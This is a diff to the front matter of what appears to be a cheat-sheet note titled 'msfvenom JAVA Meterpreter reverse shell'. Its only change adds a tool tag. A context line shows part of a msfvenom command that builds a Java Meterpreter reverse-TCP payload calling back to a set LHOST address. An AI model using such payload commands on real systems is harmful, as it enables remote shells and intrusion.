@@ -15,6 +15,8 @@ output: 'root@hackers:~# msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.1
   '
 created_at: '2019-09-17T17:35:37.338602+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[msfvenom]]'
 ---
 
 # msfvenom JAVA Meterpreter reverse shell
